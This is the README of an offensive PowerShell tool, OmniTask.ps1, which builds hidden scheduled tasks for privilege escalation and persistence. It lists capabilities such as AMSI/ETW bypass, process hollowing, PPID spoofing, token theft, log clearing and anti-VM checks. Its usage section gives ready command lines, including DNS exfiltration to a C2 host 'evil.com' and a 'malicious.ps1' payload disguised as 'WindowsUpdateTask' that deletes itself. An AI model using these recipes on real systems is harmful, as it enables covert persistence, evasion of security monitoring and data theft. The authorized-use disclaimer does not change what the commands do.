## sl0ppy-privesctaskcreator
A PowerShell-based tool for creating highly customizable, EDR-evasive scheduled tasks with advanced persistence and execution options.

## 🔥 Key Improvements in v3.2
```
* Core Enhancements
* ✅ EDR Evasion – Direct/indirect syscalls, AMSI/ETW bypass, API unhooking
* ✅ 12+ Execution Methods – cmd, powershell, wscript, mshta, rundll32, etc.
* ✅ 50+ Customization Flags – Fine-grained control over every aspect
* ✅ Advanced Persistence – WMI, registry, services, startup, secondary tasks
* ✅ Process Injection – Hollowing, PPID spoofing, threadless injection
* ✅ Network Evasion – DNS exfil, proxy/Tor support, custom user agents
* ✅ Anti-Forensics – Log clearing, ADS hiding, self-deletion
* ✅ Anti-Debug/Anti-VM – Comprehensive checks to evade analysis
* ✅ Backward Compatibility
* ✅ All original v3.1 features preserved
* ✅ Same core scheduling logic with enhanced reliability
```

## 🛠 Features
# 🔧 Core Functionality
```
* Dynamic Script Execution – Run any .ps1 script with elevated privileges
* Automated Scheduling – Precise timing control with jitter for evasion
* Hidden Execution – Tasks run invisibly with highest privileges
* Repetition Support – Custom intervals (e.g., PT1H for hourly)
* Wake & Network Control – Wake system for execution, enforce network dependency
* User Impersonation – Run as SYSTEM, a custom user, or with token manipulation

* 🛡 EDR Evasion Techniques
* AMSI BypassContext nullification, patching, multiple methodsETW EvasionBypass, patching, provider blockingProcess InjectionHollowing, PPID spoofing, threadless injectionMemory ProtectionDirect/indirect syscalls, reflective loadingAnti-ForensicsLog clearing, ADS hiding, self-deletionAnti-Debug/Anti-VMDebugger checks, VM detection (VBox, VMware, Hyper-V)API UnhookingRestores hooked APIs (NtCreateProcess, etc.)
* 🔄 Persistence Methods
* WMI Event SubscriptionTriggers on system eventsRegistry Run KeysHKCU\...\Run persistenceService InstallationCreates a fake Windows serviceStartup FolderAdds shortcut to startupSecondary TasksCreates backup scheduled tasksAlternate Data StreamsHides payloads in NTFS streams
* 🌐 Network Evasion


* DNS Exfiltration – C2 over DNS (port 53)

* Proxy/Tor Support – Route traffic through proxies or Tor
* Custom User Agents – Mimic legitimate browser traffic
* HTTPS Encryption – Secure C2 communications
```
## 🔐 Process Manipulation
```
* PPID Spoofing – Fake parent process (e.g., explorer.exe)

* Token Impersonation – Steal tokens from other processes

* Privilege Escalation – Enable all privileges (SeDebugPrivilege, etc.)

* Critical Process – Mark process as critical to prevent termination
```

## 📜 Encoding & Obfuscation
```
* Base64Encodes PowerShell commandsXORSimple byte XOR encryptionRC4Stream cipher encryptionAESStrong symmetric encryptionSecureStringHides commands in memory
```

## 📋 Prerequisites
```
* Windows OS (7/10/11, Server 2012+)
* Administrator Privileges (for task creation)
* PowerShell 5.1+ (preinstalled on modern Windows)
* Target Script (.ps1 file must exist at the specified path)
```

## 🚀 Installation
```
* git clone https://github.com/x0xr00t/sl0ppy-PriveSCTaskCreator.git
* cd PriveSCTaskCreator
* The script is now ready to run.
```
📖 Usage
```
* 🔹 Basic Execution
* Run a PowerShell script with elevated privileges:
.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1"
* 🔹 EDR Evasion Mode
* Bypass AMSI, ETW, and use direct syscalls:
.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" -BypassAMSI -BypassETW -UseDirectSyscalls
* 🔹 Stealth Mode (Maximum OpSec)
.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
*     -Hidden -RandomizeName -AddJitter `
*     -UseAlternateDataStream -Base64Encode `
*     -BypassAMSI -BypassETW -AntiDebug -AntiVM `
*     -ClearLogs -DisableLogging
* 🔹 Process Injection
Hollow svchost.exe and spoof PPID:
.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
*     -ProcessHollowing -HollowProcess "svchost.exe" `
*     -PPIDSpoofing -SpoofedPPID 840
* 🔹 Persistence Combo
.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
*     -WMIPersistence -RegistryPersistence `
*     -ServicePersistence -SchTaskPersistence
* 🔹 Network Evasion (C2 over DNS)
.\OmniTask.ps1 -FilePath "C:\Payloads\script.ps1" `
*     -UseDNSExfil -C2Server "evil.com" -C2Port 53 `
*     -UseProxy -ProxyAddress "192.168.1.100" -ProxyPort 8080
* 🔹 Full Customization Example
.\OmniTask.ps1 -FilePath "C:\Payloads\malicious.ps1" `
*     -CustTaskName "WindowsUpdateTask" `
*     -Time (Get-Date).AddMinutes(15) `
*     -RepeatInterval "PT1H" `
*     -RunOnBattery -Hidden -WakeToRun `
*     -UseDirectSyscalls -BypassAMSI -BypassETW `
*     -ProcessHollowing -HollowProcess "explorer.exe" `
*     -PPIDSpoofing -SpoofedPPID 1234 `
*     -WMIPersistence -RegistryPersistence `
*     -SelfDelete -AddJitter -JitterMinutes 10
```

## ⚙ Configuration
```
* Default Settings

* Run Level: HighestAvailable (SYSTEM privileges)
* Visibility: Hidden (if -Hidden is set)
* Triggers: Time-based (customizable)
* Execution Policy: Bypass mode (-ExecutionPolicy Bypass)

* Customizing the Task XML
* Modify the $taskXml variable in the script to adjust:

* Security descriptors
* Priority levels
* Additional triggers
```

🛠 Troubleshooting
```
Task not createdRun PowerShell as AdministratorFile path errorsVerify the .ps1 file existsTask not executingCheck Event Viewer → Task Scheduler logsProcess not foundTest the script manually firstEDR blocking executionEnable more evasion flags (-BypassAMSI, -UseDirectSyscalls)Anti-VM detectedRun on bare metal or adjust -AntiVM checks
Debugging Tips:
# View Task Scheduler logs
Get-WinEvent -LogName "Microsoft-Windows-TaskScheduler/Operational" | Select-Object -First 20

# Check if task exists
Get-ScheduledTask -TaskName "YourTaskName"
```
## ⚠ Disclaimer

# ⚠️ For Authorized Use Only
```
This tool is designed for legitimate red teaming, penetration testing, and security research.
Unauthorized use against systems you do not own is illegal.
The author is not responsible for misuse.
```

## 📜 License
```
* GNU GPLv3 – See LICENSE for details.
```

## 🤝 Contributing
```
Pull requests are welcome! Feel free to:
* ✅ Add new evasion techniques
* ✅ Improve error handling
* ✅ Optimize performance
```

## 📌 Changelog
```
* v3.2 "Sl0ppy-PrivTaskCreator" (Current)

* Complete rewrite with EDR evasion focus
* 50+ new parameters for customization
* 12 execution methods (up from 1)
* Advanced persistence (WMI, services, etc.)
* Process injection (hollowing, PPID spoofing)
* Network evasion (DNS, proxy, Tor)
```

## v3.1 (Legacy)
```
Basic scheduled task creation
Custom naming & timing
Hidden execution
Network/ wake controls
```

